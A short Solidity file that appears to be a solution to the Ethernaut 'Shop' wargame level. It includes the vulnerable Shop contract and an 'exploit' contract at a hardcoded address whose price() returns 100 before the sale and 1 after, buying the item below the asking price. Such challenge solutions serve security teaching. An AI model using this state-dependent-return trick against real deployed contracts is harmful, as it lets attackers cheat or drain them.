// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract exploit{
    Shop contractt = Shop(0x029ed52DCd04C4988D4fc4cFBAf95926cC2A5cce);
    function price() external view returns(uint){
        uint _price = contractt.isSold() == false ? 100 : 1;
        return _price;
    }

    function callbuy() public{
        contractt.buy();
    }
}